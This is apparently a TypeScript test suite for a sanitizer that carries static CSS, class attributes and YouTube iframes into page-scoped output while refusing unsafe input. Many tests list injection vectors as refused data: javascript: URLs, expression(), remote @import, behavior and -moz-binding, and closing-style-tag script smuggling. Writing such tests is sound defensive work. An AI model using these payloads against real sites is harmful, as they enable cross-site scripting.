    '@media (max-width: 673px){[data-page="a"] .TimeLine li:last-child label{left: -2.8%}}\n' +
      '@media (min-width : 993px){[data-page="a"] .chartDiv{height : 275px}}',
  );
  // Refused declarations inside the wrapped rule still count by name.
  const partial = carryStaticStyle('@media (min-width:1px) .a { color: red; background: url(//x.test/a) }', '[data-page="a"]');
  assert.equal(partial.css, '@media (min-width:1px){[data-page="a"] .a{color: red}}');
  assert.deepEqual(partial.dropped, ['background declaration']);
  // A selector that could reach outside the page scope stays refused.
  for (const css of [
    '@media (min-width:1px) ~ * { display: none }',
    '@media (min-width:1px) .a, + div { color: red }',
    '@media (url(x)) .a { color: red }',
  ]) {
    const result = carryStaticStyle(css, '[data-page="a"]');
    assert.equal(result.css, '', css);
    assert.equal(result.droppedRules, 1, css);
  }
});

test('-ms- and -o- vendor gradients carry like the other prefixed gradients', () => {
  const result = carryStaticStyle(
    '.a { background-image: -ms-linear-gradient(top, #0088cc, #0055cc); background-image: -o-radial-gradient(center, #fff, #eee) }',
    '[data-page="a"]',
  );
  assert.deepEqual(result.dropped, []);
  assert.equal(
    result.css,
    '[data-page="a"] .a{background-image: -ms-linear-gradient(top, #0088cc, #0055cc);background-image: -o-radial-gradient(center, #fff, #eee)}',
  );
});

test('a quoted url() carries its same-origin target and refuses remote and script ones', () => {
  const carried = carryStaticStyle(
    [
      '.a { background-image: url("img/bg.png") }',
      ".b { background: url('icons/dot.png') no-repeat }",
      '.c { background-image: url( ./img/p.png ) }',
      '.d { cursor: url("cursor.cur"), pointer }',
    ].join('\n'),
    '[data-page="a"]',
  );
  assert.deepEqual(carried.dropped, []);
  assert.equal(
    carried.css,
    [
      '[data-page="a"] .a{background-image: url("img/bg.png")}',
      "[data-page=\"a\"] .b{background: url('icons/dot.png') no-repeat}",
      '[data-page="a"] .c{background-image: url( ./img/p.png )}',
      '[data-page="a"] .d{cursor: url("cursor.cur"), pointer}',
    ].join('\n'),
  );
  for (const css of [
    '.a { background-image: url("//cdn.example.test/x.png") }',
    ".a { background-image: url('https://x.test/a.png') }",
    ".a { background-image: url('javascript:alert(1)') }",
    '.a { background-image: url("data:text/html,x") }',
    ".a { background-image: url('a b.png') }",
    ".a { background-image: url('x</style><script>alert(1)</script>') }",
    '.a { background-image: url("x.png"y) }',
  ]) {
    const result = carryStaticStyle(css, '[data-page="a"]');
    assert.equal(result.css, '', css);
    assert.equal(result.droppedRules, 1, css);
  }
});

test('var() carries a custom property reference and a safe fallback but never a fetch', () => {
  const result = carryStaticStyle(
    '.a { --brand: #0088cc; background: var(--brand); color: var(--ink, #222); margin: var(--gap, 0) }',
    '[data-page="a"]',
  );
  assert.deepEqual(result.dropped, []);
  assert.equal(
    result.css,
    '[data-page="a"] .a{--brand: #0088cc;background: var(--brand);color: var(--ink, #222);margin: var(--gap, 0)}',
  );
  for (const css of [
    '.a { background: var(--x, url(//x.test/a)) }',
    '.a { background: var() }',
    '.a { background: var(x) }',
    '.a { background: var(--x; color:red) }',
  ]) {
    const result = carryStaticStyle(css, '[data-page="a"]');
    assert.equal(result.css, '', css);
    assert.equal(result.droppedRules, 1, css);
  }
});

test('translateZ and scaleZ carry like the other 3D transform functions', () => {
  const result = carryStaticStyle(
    '.a { -webkit-transform: translateZ(0); transform: translateZ(0) scaleZ(1) rotateY(180deg) }',
    '[data-page="a"]',
  );
  assert.deepEqual(result.dropped, []);
  assert.equal(result.css, '[data-page="a"] .a{-webkit-transform: translateZ(0);transform: translateZ(0) scaleZ(1) rotateY(180deg)}');
});

test('static transform declarations carry for modern and legacy prefixes, but never URL/script vectors', () => {
  const safe = carryStaticStyle(
    '.a { transform: translate3d(10px, 20px, 0); -moz-transform: rotate(10deg); -o-transform: scale(1.2); -webkit-transform: matrix(1, 0, 0, 1, 4, 5) }',
    '[data-page="a"]',
  );
  assert.equal(safe.droppedRules, 0);
  assert.match(safe.css, /transform: translate3d\(10px, 20px, 0\)/);
  assert.match(safe.css, /-moz-transform: rotate\(10deg\)/);
  assert.match(safe.css, /-o-transform: scale\(1\.2\)/);
  assert.match(safe.css, /-webkit-transform: matrix\(1, 0, 0, 1, 4, 5\)/);

  for (const property of ['transform', '-moz-transform', '-o-transform', '-webkit-transform']) {
    for (const value of ['url(x)', 'expression(alert(1))', 'url(javascript:alert(1))']) {
      const refused = carryStaticStyle(`.a { ${property}: ${value} }`, '[data-page="a"]');
      assert.equal(refused.css, '', `${property}: ${value}`);
      assert.deepEqual(refused.dropped, [`${property} declaration`], `${property}: ${value}`);
    }
  }
});

test('transform declarations fail closed on CSS escapes and comment splitting', () => {
  for (const property of ['transform', '-moz-transform', '-o-transform', '-webkit-transform']) {
    for (const value of ['\\75rl(x)', '\\000075rl(x)', 'u/**/rl(x)', 'var(--x, url(x))', 'calc(1 + url(x))']) {
      const refused = carryStaticStyle(`.a { ${property}: ${value} }`, '[data-page="a"]');
      assert.equal(refused.css, '', `${property}: ${value}`);
    }
  }
  const escapedProperty = carryStaticStyle('.a { \\74 ransform: rotate(1deg) }', '[data-page="a"]');
  assert.equal(escapedProperty.css, '');
  for (const fn of ['rotate(10deg)', 'scale(1.2)', 'translate(1px, 2px)', 'matrix(1, 0, 0, 1, 0, 0)']) {
    assert.match(carryStaticStyle(`.a { transform: ${fn} }`, '[data-page="a"]').css, new RegExp(fn.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')));
  }
});

test('legacy digit-named properties carry with a checked value, like scrollbar-3dlight-color', () => {
  const result = carryStaticStyle('.a { scrollbar-3dlight-color: #fff; scrollbar-face-color: #eee }', '[data-page="a"]');
  assert.deepEqual(result.dropped, []);
  assert.equal(result.css, '[data-page="a"] .a{scrollbar-3dlight-color: #fff;scrollbar-face-color: #eee}');
  const refused = carryStaticStyle('.a { scrollbar-3dlight-color: url(//x.test/a) }', '[data-page="a"]');
  assert.equal(refused.css, '');
  assert.deepEqual(refused.dropped, ['scrollbar-3dlight-color declaration']);
});

test('a piece without a colon is skipped like a browser and is not a loss', () => {
  const carried = carryStaticStyle('.a { color: red; inherit; width: 1px; !important }', '[data-page="a"]');
  assert.equal(carried.css, '[data-page="a"] .a{color: red;width: 1px}');
  assert.deepEqual(carried.dropped, []);
  // Creator exports a half-typed `border-left` as `border- 1px solid rgb(..)`; the browser never applied it either.
  for (const css of ['.a { color: red; a=b }', '.a { color: red; x(y) }', '.a { color: red; <b> }', '.a { color: red; border- 1px solid rgb(93,155,215) }']) {
    const result = carryStaticStyle(css, '[data-page="a"]');
    assert.equal(result.css, '[data-page="a"] .a{color: red}', css);
    assert.deepEqual(result.dropped, [], css);
  }
  // A colon-less piece never hides a following declaration or smuggles one in.
  const hostile = carryStaticStyle('.a { url(//x.test/a); background:url(//x.test/b); color: blue }', '[data-page="a"]');
  assert.equal(hostile.css, '[data-page="a"] .a{color: blue}');
  assert.deepEqual(hostile.dropped, ['background declaration']);
});

test('an IE alpha() filter carries as its modern opacity equivalent; fetching filters stay refused', () => {
  const result = carryStaticStyle(
    '.a { filter: alpha(opacity=50) } .b { filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=30) } .c { filter: alpha(opacity=100) !important }',
    '[data-page="a"]',
  );
  assert.deepEqual(result.dropped, []);
  assert.equal(result.css, '[data-page="a"] .a{opacity:0.5}\n[data-page="a"] .b{opacity:0.3}\n[data-page="a"] .c{opacity:1 !important}');
  for (const css of [
    '.a { filter: progid:DXImageTransform.Microsoft.AlphaImageLoader(src=x.png) }',
    '.a { filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#a,endColorstr=#b) }',
    '.a { filter: alpha(opacity=50,style=1) }',
    '.a { -ms-filter: "alpha(opacity=50)" }',
  ]) {
    const result = carryStaticStyle(css, '[data-page="a"]');
    assert.equal(result.css, '', css);
    assert.equal(result.droppedRules, 1, css);
  }
});

test('an IE gradient() filter carries plain colour/flag arguments; any other shape stays refused', () => {
  const carried = carryStaticStyle(
    [
      '.a { filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#fff,endColorstr=#000,GradientType=0,enabled=false) }',
      ".b { filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#fff5f5f5', endColorstr='#fff1f1f1', GradientType=0, enabled=true) }",
      // A <style> raw-text element never decodes entities, so a sheet built with &apos; quoting carries as written.
      '.c { filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=&apos;#fffcf8e3&apos;, endColorstr=&apos;rgba(240, 173, 78, 0.54)&apos;, GradientType=0,enabled=true) }',
      '.d { -ms-filter: gradient(startColorstr=rgba(0,0,0,0.5),endColorstr=#fff,GradientType=1,enabled=false) }',
    ].join('\n'),
    '[data-page="a"]',
  );
  assert.deepEqual(carried.dropped, []);
  assert.equal(carried.css.split('\n').length, 4);
  assert.match(carried.css, /startColorstr=#fff,endColorstr=#000,GradientType=0,enabled=false/);
  assert.doesNotMatch(carried.css, /startColorstr='#fff5f5f5'/);
  // Every accepted form is re-emitted from validated parts: raw quoting, entities and spacing never survive.
  assert.match(carried.css, /\.b\{filter:progid:DXImageTransform\.Microsoft\.gradient\(startColorstr=#fff5f5f5,endColorstr=#fff1f1f1,GradientType=0,enabled=true\)\}/);
  assert.match(carried.css, /\.c\{filter:progid:DXImageTransform\.Microsoft\.gradient\(startColorstr=#fffcf8e3,endColorstr=rgba\(240,173,78,0\.54\),GradientType=0,enabled=true\)\}/);
  assert.doesNotMatch(carried.css, /&apos;|'|, /);
  for (const css of [
    // #a / #b are not valid hex colours (need 3, 4, 6 or 8 digits).
    '.a { filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#a,endColorstr=#b) }',
    // A key outside the recognized set refuses the whole filter, not just that argument.
    '.a { filter: progid:DXImageTransform.Microsoft.gradient(enabled=true,extra=1) }',
    '.a { filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#fff,startColorstr=#000,endColorstr=#fff,GradientType=0,enabled=true) }',
    '.a { filter: progid:DXImageTransform.Microsoft.gradient(src=x.png) }',
    // Unterminated or mismatched parens never resolve to a safe argument list.
    '.a { filter: progid:DXImageTransform.Microsoft.gradient(enabled=false }',
    '.a { filter: progid:DXImageTransform.Microsoft.gradient() }',
    // A scheme or markup smuggled through the colour argument stays refused.
    '.a { filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=javascript:alert(1)) }',
    '.a { filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=\'#fff</style><script>1</script>\') }',
    // A url() nested inside the colour's rgba() call is never a colour value.
    '.a { filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=rgba(0,0,0,url(evil)),endColorstr=#fff) }',
    // The whole filter value quoted (not just the colour argument) is a different, unverified shape.
    ".a { -ms-filter: 'progid:DXImageTransform.Microsoft.gradient(enabled=false)' }",
  ]) {
    const result = carryStaticStyle(css, '[data-page="a"]');
    assert.equal(result.css, '', css);
    assert.equal(result.droppedRules, 1, css);
  }
});

test('an IE gradient() enabled-only switch carries in canonical form', () => {
  const carried = carryStaticStyle(
    [
      '.a { filter: progid:DXImageTransform.Microsoft.gradient(enabled=false) }',
      '.b { -ms-filter: progid:DXImageTransform.Microsoft.gradient( enabled = true ) }',
    ].join('\n'),
    '[data-page="a"]',
  );
  assert.deepEqual(carried.dropped, []);
  assert.equal(
    carried.css,
    '[data-page="a"] .a{filter:progid:DXImageTransform.Microsoft.gradient(enabled=false)}\n' +
      '[data-page="a"] .b{-ms-filter:progid:DXImageTransform.Microsoft.gradient(enabled=true)}',
  );
  for (const css of [
    '.a { filter: progid:DXImageTransform.Microsoft.gradient(enabled=false,enabled=true) }',
    '.a { filter: progid:DXImageTransform.Microsoft.gradient(enabled=false,GradientType=0) }',
    '.a { filter: progid:DXImageTransform.Microsoft.gradient(enabled=0) }',
  ]) {
    const result = carryStaticStyle(css, '[data-page="a"]');
    assert.equal(result.css, '', css);
    assert.equal(result.droppedRules, 1, css);
  }
});

test('a @font-face block carries when every descriptor checks out, else it is refused whole', () => {
  const carried = carryStaticStyle(
    '@font-face { font-family: "My Font"; src: local("My Font"), url(/fonts/my.woff2) format("woff2"), url(data:font/woff2;base64,d09GMg==) format("woff2"); font-weight: 700; unicode-range: U+0025-00FF, U+4?? } .a { color: red }',
    '[data-page="a"]',
  );
  assert.deepEqual(carried.dropped, []);
  assert.equal(
    carried.css,
    '@font-face{font-family: "My Font";src: local("My Font"), url(/fonts/my.woff2) format("woff2"), url(data:font/woff2;base64,d09GMg==) format("woff2");font-weight: 700;unicode-range: U+0025-00FF, U+4??}\n[data-page="a"] .a{color: red}',
  );
  for (const [css, label] of [
    ['@font-face { font-family: X; src: url(//cdn.example.test/f.woff2) }', 'src declaration'],
    ['@font-face { font-family: X; src: url("javascript:x") }', 'src declaration'],
    ['@font-face { font-family: X; src: url(data:text/html,x) }', 'src declaration'],
    ['@font-face { font-family: X; zoom: 1 }', 'zoom declaration'],
    ['@font-face { font-family: X; src: "stray" }', 'src declaration'],
  ] as const) {
    const result = carryStaticStyle(css, '[data-page="a"]');
    assert.equal(result.css, '', css);
    assert.deepEqual(result.dropped, [label], css);
  }
});

test('a // comment inside a rule body ends its declaration instead of hiding the closing brace', () => {
  // The closing brace used to be eaten with the comment: the rule and the
  // rest of the sheet were lost as unparsed CSS.
  const result = carryStaticStyle('.a { width: 10px // note\n height: 5px } .b { color: blue }', '[data-page="a"]');
  assert.deepEqual(result.dropped, []);
  assert.equal(result.css, '[data-page="a"] .a{width: 10px;height: 5px}\n[data-page="a"] .b{color: blue}');
  const noNewline = carryStaticStyle('.a { width: 10px // note } .b { color: blue }', '[data-page="a"]');
  assert.deepEqual(noNewline.dropped, []);
  assert.equal(noNewline.css, '[data-page="a"] .a{width: 10px}\n[data-page="a"] .b{color: blue}');
  // A // inside a url() is still part of the call, not a comment.
  const refused = carryStaticStyle('.a { background: url(//x.test/a) }', '[data-page="a"]');
  assert.equal(refused.css, '');
  assert.deepEqual(refused.dropped, ['background declaration']);
});

test('the real corpus gradient shape (entity-quoted colours, GradientType, no enabled key) carries normalised; colours stay required', () => {
  const corpus = carryStaticStyle(
    [
      ".a { filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=&apos;#fffcf8e3&apos;, endColorstr=&apos;rgba(240, 173, 78, 0.54)&apos;, GradientType=0); }",
      ".b { filter: progid:DXImageTransform.Microsoft.gradient( startColorstr = '#fff5f5f5' , endColorstr = '#fff1f1f1' , GradientType = 0 ) }",
      ".c { -ms-filter: progid:DXImageTransform.Microsoft.gradient(enabled=false) }",
    ].join('\n'),
    '[data-page="a"]',
  );
  assert.deepEqual(corpus.dropped, []);
  assert.equal(corpus.droppedRules, 0);
  assert.equal(corpus.css.split('\n').length, 3);
  assert.match(corpus.css, /\.a\{filter:progid:DXImageTransform\.Microsoft\.gradient\(startColorstr=#fffcf8e3,endColorstr=rgba\(240,173,78,0\.54\),GradientType=0\)\}/);
  assert.match(corpus.css, /\.b\{filter:progid:DXImageTransform\.Microsoft\.gradient\(startColorstr=#fff5f5f5,endColorstr=#fff1f1f1,GradientType=0\)\}/);
  assert.doesNotMatch(corpus.css, /&apos;|'|, | = /);
  for (const css of [
    '.a { filter: progid:DXImageTransform.Microsoft.gradient(GradientType=0) }',
    '.a { filter: progid:DXImageTransform.Microsoft.gradient(startColorstr=#fff,GradientType=0) }',
    '.a { filter: progid:DXImageTransform.Microsoft.gradient(endColorstr=#fff,GradientType=0,enabled=true) }',
  ]) {
    const result = carryStaticStyle(css, '[data-page="a"]');
    assert.equal(result.css, '', css);
    assert.equal(result.droppedRules, 1, css);
  }
});

// A page stylesheet often pulls its CSS from an app function that only returns
// a string literal (`<%=thisapp.style.home()%>`). That text is constant, so it
// carries through the same sheet sanitizer as CSS written inline.
const styleFn = (name: string, body: string, signature = `string ${name}()`) => ({
  name,
  kind: 'deluge' as const,
  signature,
  deluge: [{ text: `\n\treturn "${body}";\n`, span: { start: 0, end: 0 } }],
  properties: [],
  span: { start: 0, end: 0 },
});
const appWith = (...functions: ReturnType<typeof styleFn>[]) => ({ functions }) as unknown as App;
const scope = '[data-page="Home"]';

test('a constant style function island carries its CSS scoped to the page', () => {
  const app = appWith(styleFn('style.home', '.row {margin: 0;}a > b {color: red;} /* for IE < 9 */'));
  const raw = '<style>\n<%=thisapp.style.home()%>\n.box { padding: 2px; }\n</style>';
  assert.deepEqual(carriedStyleRules(raw, scope).dropped, ['CSS built by a Deluge tag']);
  const carried = carriedStyleRules(inlineConstantStyleCalls(raw, app), scope);
  assert.deepEqual(carried.dropped, []);
  assert.match(carried.css, /\[data-page="Home"\] \.row\{margin: 0\}/);
  assert.match(carried.css, /\[data-page="Home"\] a > b\{color: red\}/);
  assert.match(carried.css, /\[data-page="Home"\] \.box\{padding: 2px\}/);
  // The XML-escaped island form resolves too.
  assert.equal(inlineConstantStyleCalls('&lt;%= thisapp.style.home() %&gt;', app).includes('.row'), true);
});

test('a style function island that is not constant CSS stays a counted Deluge tag', () => {
  const cases = [
    styleFn('style.home', 'a{color:red}', 'string style.home(string c)'),
    styleFn('style.home', 'a{color:red}', 'void style.home()'),
    styleFn('style.home', 'a{color:\" + input.c + \"}'),
    styleFn('style.home', 'a{color:red}</style><script>x()</script><style>'),
    styleFn('style.home', 'a{color:red}&lt;/style&gt;'),
    styleFn('style.other', 'a{color:red}'),
  ];
  for (const fn of cases) {
    const raw = '<style><%=thisapp.style.home()%></style>';
    const resolved = inlineConstantStyleCalls(raw, appWith(fn));
    assert.equal(resolved, raw, `${fn.signature} ${fn.deluge[0]!.text}`);
    assert.deepEqual(carriedStyleRules(resolved, scope).dropped, ['CSS built by a Deluge tag']);
  }
  const logic = { ...styleFn('style.home', 'a{color:red}'), deluge: [{ text: 'c = "red";\nreturn "a{color:" + c + "}";', span: { start: 0, end: 0 } }] };
  assert.equal(inlineConstantStyleCalls('<style><%=thisapp.style.home()%></style>', appWith(logic as ReturnType<typeof styleFn>)).includes('<%='), true);
});

const sheetFn = (name: string, text: string, signature = `string ${name}()`) => ({
  ...styleFn(name, ''),
  signature,
  deluge: [{ text, span: { start: 0, end: 0 } }],
});

test('a function that builds one constant style element by concatenation carries its CSS where the page prints it', () => {
  const built = sheetFn('css.lib', 'sheet = "";\nsheet = sheet + "<style>";\nsheet = sheet + ".row {margin: 0;}";\nsheet = sheet + "</style>";\nreturn sheet;');
  const app = appWith(built);
  const once = inlineConstantStyleCalls('<div><%=thisapp.css.lib()%></div>', app);
  assert.equal(once, '<div><style>.row {margin: 0;}</style></div>');
  assert.match(carriedStyleRules(once, scope).css, /\[data-page="Home"\] \.row\{margin: 0\}/);
  const chained = inlineConstantStyleCalls('<%=thisapp.css.lib() + thisapp.fn.rows(input.id)%>', app);
  assert.equal(chained, '<style>.row {margin: 0;}</style><%=thisapp.fn.rows(input.id)%>');
  assert.equal(inlineConstantStyleCalls('&lt;%= thisapp.css.lib() %&gt;', app).startsWith('<style>'), true);
  const single = inlineConstantStyleCalls('<%=thisapp.css.one()%>', appWith(sheetFn('css.one', 'css = "<style>a{color:red}</style>";\nreturn css;')));
  assert.equal(single, '<style>a{color:red}</style>');
});

test('a function that is not one constant style element stays an island', () => {
  const cases = [
    sheetFn('css.lib', 'sheet = "<style>a{color:red}</style>";\nreturn sheet;', 'string css.lib(string c)'),
    sheetFn('css.lib', 'sheet = "<style>a{color:" + input.c + "}</style>";\nreturn sheet;'),
    sheetFn('css.lib', 'sheet = "<style>a{color:red}</style><b>x</b>";\nreturn sheet;'),
    sheetFn('css.lib', 'sheet = "<style>a{color:red}</style>";\nsheet = sheet + Orders.count();\nreturn sheet;'),
    sheetFn('css.lib', 'sheet = "<style>a{color:red}</style>";\nother = "x";\nreturn sheet;'),
    sheetFn('css.lib', 'if (true) { sheet = "<style>a{color:red}</style>"; }\nreturn sheet;'),
    sheetFn('css.lib', 'sheet = "<style>a{content:\\"&lt;\\"}</style>";\nreturn sheet;'),
    sheetFn('css.lib', 'sheet = "<style>a{color:red}</style>";\nreturn "x";'),
  ];
  for (const fn of cases) {
    const raw = '<div><%=thisapp.css.lib()%></div>';
    assert.equal(inlineConstantStyleCalls(raw, appWith(fn)), raw, fn.deluge[0]!.text);
  }
  const app = appWith(sheetFn('css.lib', 'sheet = "<style>a{color:red}</style>";\nreturn sheet;'));
  const nested = '<style><%=thisapp.css.lib()%></style>';
  assert.equal(inlineConstantStyleCalls(nested, app), nested);
});

test('unsafe CSS from a constant style function is still dropped and named', () => {
  const unsafe: [string, string][] = [
    ['.a{background: url(https://x.example/i.png)}', 'background declaration'],
    ['.a{width: expression(alert(1))}', 'width declaration'],
    ['@import "https://x.example/s.css";', '@import'],
    ['.a{behavior: url(x.htc)}', 'behavior declaration'],
    ['.a{-moz-binding: url(x.xml#b)}', '-moz-binding declaration'],
    ['.a{background-image: url(javascript:alert(1))}', 'background-image declaration'],
  ];
  for (const [css, label] of unsafe) {
    const app = appWith(styleFn('style.home', css.replace(/\\/g, '\\\\').replace(/"/g, '\\"')));
    const carried = carriedStyleRules(inlineConstantStyleCalls('<style><%=thisapp.style.home()%>.ok{color:red}</style>', app), scope);
    assert.deepEqual(carried.dropped, [label], css);
    assert.doesNotMatch(carried.css, /url\(|expression|@import|behavior|binding|javascript/i, css);
    assert.match(carried.css, /\[data-page="Home"\] \.ok\{color:red\}/);
  }
});

test('a declaration or selector a Deluge tag builds is counted once, as the tag', () => {
  const raw = '<style>\n.dial { color: <%=c%>; -webkit-transform: rotate(<%=angle%>deg); color: red; }\ntable#t_<%=n%> { display: none; }\n.ok { padding: 1px; }\n</style>';
  const carried = carriedStyleRules(raw, scope);
  assert.deepEqual(carried.dropped, ['CSS built by a Deluge tag', 'CSS built by a Deluge tag']);
  assert.match(carried.css, /\[data-page="Home"\] \.dial\{-webkit-transform: rotate\(var\(--cssvalue-a\)\);color: red\}/);
  assert.match(carried.css, /\[data-page="Home"\] \.ok\{padding: 1px\}/);
  assert.doesNotMatch(carried.css, /table#t_|/);
  // An island between rules stays the only loss; the rule after it carries.
  const between = carriedStyleRules('<style><%=thisapp.style.dynamic(a)%>\nh1 { margin: 0; }</style>', scope);
  assert.deepEqual(between.dropped, ['CSS built by a Deluge tag']);
  assert.match(between.css, /\[data-page="Home"\] h1\{margin: 0\}/);
});

test('the dropped-CSS manual step names each dropped rule by its selector or Deluge tag', () => {
  const raw = '<style>\n.hero { background: url(https://x.example/a.png); color: red; }\n@import "https://x.example/s.css";\n@media (max-width: 600px) { .side { behavior: url(x.htc); } }\n.a, .b { -moz-binding: url(x.xml#b); }\n.c { -moz-binding: url(y.xml#b); }\n<%=thisapp.style.dynamic(a)%>\n</style>';
  const carried = carriedStyleRules(raw, scope);
  assert.equal(carried.droppedRules, 6);
  const { step } = droppedStyleRulesTodo('Home', carried.droppedRules, carried.dropped, carried.where);
  assert.match(step, /Dropped: <%=thisapp\.style\.dynamic\(a\)%> \(CSS built by a Deluge tag\); \.hero \(background declaration\); @import "https:\/\/x\.example\/s\.css" \(@import\); @media \(max-width: 600px\) \.side \(behavior declaration\); \.a, \.b \(-moz-binding declaration\); \.c \(-moz-binding declaration\)\. Restyle/);
  // Without rule locations the step keeps its plain wording.
  assert.doesNotMatch(droppedStyleRulesTodo('Home', 1, ['@import']).step, /Dropped:/);
});

// A carried `<style>` rule is scoped as `[data-page="P"] .card`, so the class
// it names has to survive every sanitizer the markup passes through. The
// generator's, the browser runtime's and the React template's copies keep a
// class token by one rule: a plain identifier that is not one of the shell's
// own overlay classes, which would let page or data markup paint over the app.

const CLASS_VECTORS: Array<[string, string, string | null]> = [
  ['plain classes', 'card wide', 'card wide'],
  ['digits, dashes and underscores', 'row-fluid span12 _x', 'row-fluid span12 _x'],
  ['bootstrap-style names', 'btn btn-primary active', 'btn btn-primary active'],
  ['an overlay class is dropped, its neighbours stay', 'a modal b', 'a b'],
  ['an overlay class in another case (quirks mode matches case-insensitively)', 'Modal SKIP-link ok', 'ok'],
  ['every overlay class', 'modal modal-close navitems skip visually-hidden skip-link c2c-modal-backdrop c2c-sr-only', null],
  ['an event handler pasted into class', 'x" onclick="alert(1)', null],
  ['an event handler as its own token', 'ok onclick=alert(1)', 'ok'],
  ['markup in a token', 'a<script>alert(1)</script>', null],
  ['a url() token', 'url(//x.test/a) b', 'b'],
  ['a leading digit', '1abc ok', 'ok'],
  ['a non-ASCII token', 'café ok', 'ok'],
  ['an escape (the escaped token goes, a plain neighbour stays)', 'a\\62 c', 'c'],
  ['a token over 64 characters', `${'a'.repeat(65)} ok`, 'ok'],
  ['blank', '   ', null],
  ['tabs and newlines between tokens', 'a\tb\nc', 'a b c'],
];

function classOf(html: string): string | null {
  const div = new JSDOM(`<body>${html}</body>`).window.document.querySelector('div');
  assert.ok(div, html);
  return div.getAttribute('class');
}

test('a class attribute is kept token by token, identically in the generator and the browser runtime', async () => {
  const run = await runtime();
  const doc = new JSDOM('<!doctype html><html><body></body></html>').window.document;
  for (const [label, value, kept] of CLASS_VECTORS) {
    const html = `<div class="${value.replace(/&/g, '&amp;').replace(/"/g, '&quot;')}">x</div>`;
    const runtimeHtml = run.sanitizeSnippet(html, doc);
    const buildHtml = buildSanitize(html);
    assert.equal(runtimeHtml, buildHtml, `${label}: both sanitizers agree`);
    assert.equal(classOf(buildHtml), kept, label);
  }
  // A pile of tokens is capped rather than copied through.
  const many = Array.from({ length: 200 }, (_, n) => `c${n}`).join(' ');
  const capped = classOf(buildSanitize(`<div class="${many}">x</div>`));
  assert.ok(capped && capped.split(' ').length <= 32, 'token count is capped');
  assert.equal(classOf(run.sanitizeSnippet(`<div class="${many}">x</div>`, doc)), capped);
});

test('a carried class rule matches the element the sanitized snippet keeps', async () => {
  const run = await runtime();
  const doc = new JSDOM('<!doctype html><html><body></body></html>').window.document;
  const carried = carryStaticStyle('.card{color:red}.btn-primary.active{color:blue}', '[data-page="Home"]').css;
  assert.equal(carried, '[data-page="Home"] .card{color:red}\n[data-page="Home"] .btn-primary.active{color:blue}');
  for (const html of [run.sanitizeSnippet('<p class="card btn-primary active">x</p>', doc), buildSanitize('<p class="card btn-primary active">x</p>')]) {
    const page = new JSDOM(`<body><div data-page="Home">${html}</div></body>`).window.document;
    assert.ok(page.querySelector('[data-page="Home"] .card'), html);
    assert.ok(page.querySelector('[data-page="Home"] .btn-primary.active'), html);
  }
});

// A `<style>` body whose Deluge tags are all statements choosing between
// whole rule groups (`<% if (...) { %> .a { } <% } %>`): each group carries
// under the marker the rendered snippet emits where that group's text would
// have printed, so the rules apply exactly when the server took that branch.
const BRANCHED = '<style>\n.base { color: red; }\n<%\nif (input.nav == "prev")\n{\n%>\n.row { animation: 1s fade; }\n<%\n}\nelse if (input.nav == "next")\n{\n%>\n.row { top: -80px; }\n<%\n}\n%>\n@keyframes fade { 0% { left: 0; } 100% { left: 5px; } }\n</style>';

test('a rule group chosen by statement tags carries under its branch marker and is not counted', () => {
  const carried = carriedStyleRules(BRANCHED, scope);
  assert.deepEqual(carried.dropped, []);
  assert.match(carried.css, /\[data-page="Home"\] \.base\{color: red\}/);
  const [prev, next] = styleBranchMarkers(BRANCHED);
  assert.equal(prev!.length, 12);
  assert.notEqual(prev, next);
  assert.match(carried.css, new RegExp(`\\[data-page="Home"\\]:where\\(:has\\(\\[title="c2c-css-${prev}"\\]\\)\\) \\.row\\{animation: 1s c2c-data-page-Home-fade\\}`));
  assert.match(carried.css, new RegExp(`:has\\(\\[title="c2c-css-${next}"\\]\\)\\) \\.row\\{top: -80px\\}`));
});

test('a branch group keeps counting what the sanitizer drops inside it', () => {
  const raw = '<style><% if (input.a == "x") { %>.hero { background: url(https://x.example/a.png); color: red; }<% } %></style>';
  const carried = carriedStyleRules(raw, scope);
  assert.deepEqual(carried.dropped, ['background declaration']);
  assert.match(carried.css, /\.hero\{color: red\}/);
  assert.doesNotMatch(carried.css, /url\(/);
});

test('a tag that builds part of a rule keeps the whole style body on the old counted path', () => {
  for (const raw of [
    '<style>.a { <% if (input.x == "1") { %> color: red; <% } %> }</style>',
    '<style>@media (max-width: 600px) { <% if (input.x == "1") { %> .a { color: red; } <% } %> }</style>',
    '<style><% if (input.x == "1") { %> .a { color: <%= input.c %>; } <% } %></style>',
  ]) {
    const carried = carriedStyleRules(raw, scope);
    assert.ok(carried.dropped.includes('CSS built by a Deluge tag'), raw);
    assert.doesNotMatch(carried.css, /:has\(/, raw);
  }
});

test('a branch group needs the statement-only body: the marker id comes from the group text alone', () => {
  assert.deepEqual(styleBranchMarkers('<style>.a{}<% if (x) { %>.b{color:red}<% } %></style>'), styleBranchMarkers('<style>.z{}<% if (y) { %>\n .b{color:red}\n<% } %></style>'));
  assert.deepEqual(styleBranchMarkers('<style><%=x%>.b{color:red}</style>'), []);
  assert.deepEqual(styleBranchMarkers('<style>.a { <% if (x) { %> color: red; <% } %> }</style>'), []);
});

// The one kept frame: a YouTube player by its 11-character id. Both
// sanitizers run the same table; everything else about an iframe is removed.
const FRAME_KEPT = '<iframe src="https://www.youtube-nocookie.com/embed/CPjUpwUpOK8" sandbox="allow-scripts allow-same-origin allow-presentation" referrerpolicy="strict-origin-when-cross-origin" loading="lazy" allowfullscreen=""></iframe>';

test('a YouTube player frame keeps its address, size and title with a fixed sandbox, in both sanitizers', async () => {
  const run = await runtime();
  const doc = new JSDOM('<!doctype html><html><body></body></html>').window.document;
  const input = '<iframe width="640" height="360" src="https://www.youtube.com/embed/CPjUpwUpOK8" title="Training" frameborder="0" allow="camera" srcdoc="<p>x</p>" onload="x()" sandbox="allow-top-navigation" style="position:fixed" allowfullscreen>fallback</iframe>';
  const want = '<iframe src="https://www.youtube-nocookie.com/embed/CPjUpwUpOK8" width="640" height="360" title="Training" sandbox="allow-scripts allow-same-origin allow-presentation" referrerpolicy="strict-origin-when-cross-origin" loading="lazy" allowfullscreen=""></iframe>';
